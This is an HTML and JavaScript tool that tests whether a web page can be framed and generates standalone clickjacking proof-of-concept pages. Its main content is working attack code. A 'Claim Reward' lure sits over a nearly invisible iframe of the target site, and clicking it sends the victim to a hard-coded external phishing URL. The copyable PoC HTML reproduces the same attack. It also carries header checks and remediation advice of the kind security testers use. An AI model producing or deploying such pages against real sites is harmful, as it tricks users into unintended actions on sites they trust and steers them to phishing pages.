<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Advanced Clickjacking Tester & PoC Generator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      background: #191f2d;
      color: #e0e8f0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0; padding: 0;
    }
    .container {
      max-width: 640px;
      margin: 40px auto;
      padding: 24px 30px;
      background: #222a3c;
      border-radius: 14px;
      box-shadow: 0 0 40px rgba(0, 0, 0, 0.7);
    }
    h1 { margin-bottom: 18px; font-weight: 700; font-size: 1.8em; color: #42d9f5; }
    label { display: block; margin-bottom: 8px; font-weight: 600; }
    input[type="url"] {
      width: 100%; padding: 12px 14px; font-size: 1.1em;
      border-radius: 8px; border: none; background: #1c2536;
      color: #d2e6ff; box-sizing: border-box; margin-bottom: 15px;
    }
    input[type="url"]:focus { outline: 3px solid #3fb1ff; }
    button {
      background-color: #3fb1ff; border: none; border-radius: 8px;
      padding: 11px 20px; font-weight: 600; color: #fff; font-size: 1em;
      cursor: pointer; margin-right: 8px;
    }
    button:disabled { background-color: #40657f; cursor: not-allowed; }
    button:hover:not(:disabled) { background-color: #2c82d3; }
    .row { margin: 12px 0 22px 0; display: flex; flex-wrap: wrap; gap: 10px; }
    .status { font-size: 1.1em; padding: 12px 10px; border-radius: 10px; margin-bottom: 20px; }
    .status.ok { background-color: #266936; color: #b2f7c2; }
    .status.bad { background-color: #672626; color: #f7b2b2; }
    .iframe-container {
      position: relative; width: 100%; height: 340px;
      border: 3px solid #244360; border-radius: 14px;
      overflow: hidden; background: #0d1622;
    }
    iframe {
      width: 100%; height: 100%; border: none;
      transition: opacity 0.25s ease; border-radius: 14px; background: white;
    }
    iframe.ghost { opacity: 0.015 !important; }
    .overlay {
      position: absolute; top: 0; left: 0; right: 0; bottom: 0;
      pointer-events: none; z-index: 11;
    }
    .lure {
      position: absolute; top: 20%; left: 18%;
      background: #ffffffdd; padding: 14px 20px;
      font-weight: 700; color: #0a2540;
      border-radius: 12px; box-shadow: 0 4px 24px rgba(0,0,0,0.42);
      cursor: grab; pointer-events: auto; z-index: 1002;
    }
    textarea {
      width: 100%; height: 150px; padding: 14px;
      background: #141e30; color: #86efac;
      border: 1.6px solid #317a2b; border-radius: 10px;
      font-family: monospace; resize: vertical;
    }
    .panel { background-color: #12202f; border-radius: 12px;
      padding: 12px 18px; margin-bottom: 12px; line-height: 1.35; }
    .desc-head { font-weight: 700; font-size: 1.2em; color: #49ddff; }
    .impact { margin-top: 10px; color: #f8d391; font-weight: 700; }
    .remediation { margin-top: 8px; color: #61de93; font-weight: 700; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Advanced Clickjacking Tester &amp; PoC Generator</h1>
    <form id="testForm" onsubmit="return false;">
      <label for="targetUrl">Target Website URL</label>
      <input type="url" id="targetUrl" placeholder="https://example.com/sensitive/action" required />
      <div class="row">
        <button id="btnTest">Test & Generate PoC</button>
        <button id="btnCopyLink" type="button">Copy Shareable Link</button>
      </div>
    </form>
    <div id="statusMsg" class="status" style="display:none;"></div>
    <div class="iframe-container" id="iframeContainer" style="display:none;">
      <iframe id="targetFrame" sandbox=""></iframe>
      <div class="overlay" id="overlay">
        <div class="lure" id="lure">Claim Reward</div>
      </div>
    </div>
    <div class="row" id="controlsRow" style="display:none;">
      <button id="btnToggleOverlay">Toggle Overlay</button>
      <button id="btnGhostFrame">Make Frame Nearly Transparent</button>
      <button id="btnResetFrame">Reset</button>
      <button id="btnShowPoC">Get Ready PoC HTML</button>
    </div>
    <section id="resultPanel" class="panel" style="display:none;">
      <div class="desc-head" id="resultHeader"></div>
      <div id="resultDescription"></div>
      <div class="impact" id="resultImpact"></div>
      <div class="remediation" id="resultRemediation"></div>
    </section>
    <section id="pocPanel" class="panel" style="display:none;">
      <label><strong>Standalone Clickjacking PoC HTML:</strong></label>
      <textarea id="pocCode" readonly></textarea>
      <button id="btnCopyPoC" type="button">Copy PoC HTML</button>
    </section>
  </div>

<script>
(function(){
  const $ = id => document.getElementById(id);
  const targetUrlInput = $('targetUrl');
  const statusMsg = $('statusMsg');
  const iframeContainer = $('iframeContainer');
  const targetFrame = $('targetFrame');
  const overlay = $('overlay');
  const lure = $('lure');
  const controlsRow = $('controlsRow');
  const resultPanel = $('resultPanel');
  const resultHeader = $('resultHeader');
  const resultDescription = $('resultDescription');
  const resultImpact = $('resultImpact');
  const resultRemediation = $('resultRemediation');
  const pocPanel = $('pocPanel');
  const pocCode = $('pocCode');

  let isVulnerable = false;
  let headerInfo = {};

  function setStatus(msg, good=false) {
    statusMsg.style.display = 'block';
    statusMsg.textContent = msg;
    statusMsg.className = 'status ' + (good ? 'ok' : 'bad');
  }

  function escapeHTML(str) {
    return str.replace(/[&<>"'`=\/]/g, s => ({
      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;',
      '`':'&#96;','=':'&#61;','/':'&#47;'
    }[s]));
  }

  async function fetchHeaders(url) {
    try {
      const resp = await fetch(url, { method: 'HEAD', mode: 'cors' });
      if (!resp.ok) return {};
      const headers = {};
      resp.headers.forEach((v,k) => headers[k.toLowerCase()] = v);
      return headers;
    } catch { return {}; }
  }

  function updateResult(vulnerable, xfo, csp) {
    if (vulnerable) {
      resultHeader.textContent = "Vulnerable to Clickjacking";
      resultDescription.innerHTML = `<strong>Description:</strong> The page can be embedded cross-origin. Detected headers: ${xfo||''} ${csp||''}`;
      resultImpact.textContent = "Impact: Potential unauthorized actions via UI redressing.";
      resultRemediation.textContent = "Remediation: Use X-Frame-Options: DENY/SAMEORIGIN or CSP frame-ancestors 'none'.";
    } else {
      resultHeader.textContent = "No Clickjacking Vulnerability Detected";
      resultDescription.innerHTML = `<strong>Description:</strong> The page cannot be embedded cross-origin. Detected headers: ${xfo||''} ${csp||''}`;
      resultImpact.textContent = "Impact: Low, clickjacking mitigated.";
      resultRemediation.textContent = "Remediation: Maintain current protections.";
    }
    resultPanel.style.display = 'block';
  }

  function generatePoCHTML(url, lureText, redirectUrl) {
    return `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8" /><title>Clickjacking PoC</title>
<style>body{margin:0;display:flex;align-items:center;justify-content:center;height:100vh;background:#1b2233;}
.wrapper{position:relative;width:480px;height:320px;border-radius:14px;overflow:hidden;}
iframe{width:100%;height:100%;border:none;opacity:1;transition:opacity .3s;}
iframe.ghost{opacity:0.015;}
.lure{position:absolute;top:25%;left:30%;background:#fff;padding:14px 18px;font-weight:bold;border-radius:12px;cursor:pointer;}</style>
</head>
<body>
<div class="wrapper">
<iframe id="pocIframe" src="${escapeHTML(url)}" sandbox></iframe>
<div class="lure" id="pocLure">${escapeHTML(lureText)}</div>
</div>
<script>
document.getElementById('pocLure').addEventListener('click',()=>{
 document.getElementById('pocIframe').classList.add('ghost');
 setTimeout(()=>{window.location.href='${escapeHTML(redirectUrl)}';},700);
});
<\/script>
</body>
</html>`;
  }

  async function testClickjacking(url){
    isVulnerable = false;
    headerInfo = await fetchHeaders(url);
    targetFrame.removeAttribute('sandbox');
    targetFrame.src = url;
    iframeContainer.style.display = 'block';
    const loaded = await new Promise(res=>{
      let to = setTimeout(()=>res(false),3000);
      targetFrame.onload = ()=>{clearTimeout(to); res(true);};
      targetFrame.onerror = ()=>{clearTimeout(to); res(false);};
    });
    if (loaded &&
       (!headerInfo['x-frame-options'] || !(/deny|sameorigin/i.test(headerInfo['x-frame-options']))) &&
       (!headerInfo['content-security-policy'] || !(/frame-ancestors[^;]*none/i.test(headerInfo['content-security-policy'])))) {
      isVulnerable = true;
      setStatus("❗ Target loaded in iframe. Vulnerable.", true);
      overlay.style.display = 'block';
      controlsRow.style.display = 'flex';
    } else {
      setStatus("✅ Framing blocked by protections.", false);
      overlay.style.display = 'none';
      controlsRow.style.display = 'none';
    }
    updateResult(isVulnerable, headerInfo['x-frame-options']||'', headerInfo['content-security-policy']||'');
  }

  // Overlay click => ghost + redirect
  lure.addEventListener('click', () => {
    if (!isVulnerable) return;
    targetFrame.classList.add('ghost');
    setStatus("Redirecting to demo phishing site...", true);
    setTimeout(() => { window.location.href = 'https://iambikash.in/phishing'; }, 700);
  });

  // Drag behaviour
  lure.addEventListener('mousedown', e=>{
    e.preventDefault();
    const startX = e.clientX, startY = e.clientY;
    const startLeft = lure.offsetLeft;
    const startTop = lure.offsetTop;
    function onMove(ev){
      lure.style.left = (startLeft + (ev.clientX - startX)) + 'px';
      lure.style.top = (startTop + (ev.clientY - startY)) + 'px';
    }
    function onUp(){
      window.removeEventListener('mousemove', onMove);
      window.removeEventListener('mouseup', onUp);
    }
    window.addEventListener('mousemove', onMove);
    window.addEventListener('mouseup', onUp);
  });

  // Controls
  $('btnTest').onclick = ()=>{ try{ new URL(targetUrlInput.value); testClickjacking(targetUrlInput.value);}catch{setStatus("Enter valid URL",false);} };
  $('btnCopyLink').onclick = async ()=>{
    try{ await navigator.clipboard.writeText(location.origin+location.pathname+'?url='+encodeURIComponent(targetUrlInput.value)); setStatus("Link copied",true); }catch{}
  };
  $('btnToggleOverlay').onclick=()=>overlay.style.display = (overlay.style.display==='none'?'block':'none');
  $('btnGhostFrame').onclick=()=>targetFrame.classList.add('ghost');
  $('btnResetFrame').onclick=()=>{ targetFrame.classList.remove('ghost'); lure.style.left='18%'; lure.style.top='20%'; };
  $('btnShowPoC').onclick=()=>{
    pocCode.value = generatePoCHTML(targetUrlInput.value, lure.textContent, 'https://iambikash.in/phishing');
    pocPanel.style.display='block';
    pocCode.select();
  };
  $('btnCopyPoC').onclick=async()=>{ try{ await navigator.clipboard.writeText(pocCode.value); setStatus("PoC copied",true);}catch{} };

  // Auto prefill from ?url=
  const qurl = new URLSearchParams(location.search).get('url');
  if(qurl){ targetUrlInput.value = qurl; testClickjacking(qurl); }

})(); // <-- Properly closed IIFE
</script>
</body>
</html>
